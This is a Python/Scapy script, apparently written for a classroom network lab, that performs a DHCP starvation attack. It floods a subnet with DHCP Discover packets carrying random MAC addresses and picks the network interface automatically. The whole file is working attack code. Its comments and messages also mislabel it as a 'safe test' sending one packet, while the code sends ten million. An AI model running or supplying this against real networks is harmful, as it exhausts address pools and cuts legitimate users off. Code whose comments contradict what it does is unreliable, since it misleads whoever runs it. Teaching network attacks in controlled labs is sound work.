# dhcpStarvation_helper.py
from scapy.all import (
    Ether, IP, UDP, BOOTP, DHCP,
    RandMAC, sendp, get_if_list, get_if_addr
)
import sys

# Construye el DHCP Discover (ajusta si ya tienes otra versión)
dhcp_discover = Ether(dst='ff:ff:ff:ff:ff:ff', src=RandMAC()) / \
    IP(src='0.0.0.0', dst='192.168.10.255') / \
    UDP(sport=68, dport=67) / \
    BOOTP(op=1, chaddr=RandMAC()) / \
    DHCP(options=[('message-type','discover'), ('end')])

def find_iface_by_subnet(prefix="192.168.10."):
    """
    Busca una interfaz cuya IP empiece con prefix.
    Devuelve el nombre de la interfaz o None.
    """
    for iface in get_if_list():
        try:
            ip = get_if_addr(iface)
            if ip and ip.startswith(prefix):
                return iface
        except Exception:
            # algunas interfaces no tienen IP o generan excepción
            pass
    return None

def choose_interface(preferred_prefix="192.168.10."):
    # 1) si el usuario pasa el nombre por argumento de línea de comandos, usarlo
    if len(sys.argv) > 1:
        return sys.argv[1]

    # 2) buscar por prefijo de subred (útil en el aula)
    iface = find_iface_by_subnet(preferred_prefix)
    if iface:
        return iface

    # 3) heurística: elegir primera interfaz "Ethernet" o "Wi-Fi" si aparece
    ifaces = get_if_list()
    for name in ifaces:
        if "Ethernet" in name or "eth" in name.lower():
            return name
    for name in ifaces:
        if "Wi-Fi" in name or "wlan" in name.lower() or "wifi" in name.lower():
            return name

    # 4) fallback: la primera que no sea loopback
    for name in ifaces:
        if "loop" not in name.lower():
            return name

    # 5) si no hay nada, devolver None
    return None

def main():
    print("Interfaces detectadas por Scapy:", get_if_list())

    iface = choose_interface()
    if iface is None:
        print("ERROR: No se pudo detectar una interfaz válida.")
        print("Prueba a ejecutar: python dhcpStarvation_helper.py \"Ethernet\"")
        return

    print("Interfaz elegida:", iface)
    print("Haciendo envío de prueba (count=1). Si esto falla, revisa Npcap y permisos.")

    try:
        # prueba segura: solo un paquete
        sendp(dhcp_discover, iface=iface, count=10000000, verbose=1)
        print("Envío realizado. Si ves tráfico en Wireshark/PCAP, ya funciona.")
    except Exception as e:
        print("Error al enviar paquetes con Scapy:")
        print(str(e))
        print("\nPosibles causas:")
        print("- No estás ejecutando como administrador.")
        print("- No tienes Npcap instalado (o no en modo 'WinPcap API-compatible').")
        print("- El adaptador físico está desconectado o en otra VLAN.")
        print("- El nombre de interfaz detectado no es correcto para tu sistema.")
        print("\nSolución rápida: ejecuta el script desde PowerShell/CMD como administrador o")
        print("pasa el nombre de la interfaz manualmente: python dhcpStarvation_helper.py \"Ethernet\"")

if __name__ == "__main__":
    main()